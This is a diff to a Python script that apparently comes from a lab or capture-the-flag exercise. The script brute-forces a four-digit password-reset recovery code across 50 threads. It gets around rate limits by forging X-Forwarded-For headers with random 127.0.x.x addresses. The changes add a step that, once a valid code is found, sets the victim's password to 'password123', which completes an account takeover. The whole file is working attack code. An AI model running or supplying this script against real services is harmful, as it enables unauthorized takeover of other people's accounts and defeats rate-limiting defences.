@@ -4,7 +4,7 @@ import requests
 import random
 import threading
 
-url = "<reset-password-url>"
+url = "<reset-password-endpoint>"
 stop_flag = threading.Event()
 num_threads = 50
 
@@ -28,21 +28,32 @@ def brute_force_code(session, start, end):
                 print("[-] Timeout reached. Try again.")
                 return
             else:
-                if "<error for invalid code>" not in r.text:
+                if "Invalid or expired recovery code!" not in r.text and "new_password" in r.text:
                     stop_flag.set()
                     print(f"[+] Found the recovery code: {code_str}")
-                    print("[+] Printing the response: ")
-                    print(r.text)
+                    print("[+] Sending the new password request.")
+                    new_password = "password123"
+                    session.post(
+                        url,
+                        data={
+                            "new_password": new_password,
+                            "confirm_password": new_password,
+                        },
+                        headers={
+                            "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
+                        },
+                    )
+                    print(f"[+] Password is set to {new_password}")
                     return
         except Exception as e:
-            #print(e)
+            # print(e)
             pass
 
 
 def main():
     session = requests.Session()
     print("[+] Sending the password reset request.")
-    session.post(url, data={"email": "<email>"})
+    session.post(url, data={"email": "<mail>"})
     print("[+] Starting the code brute-force.")
     code_range = 10000
     step = code_range // num_threads
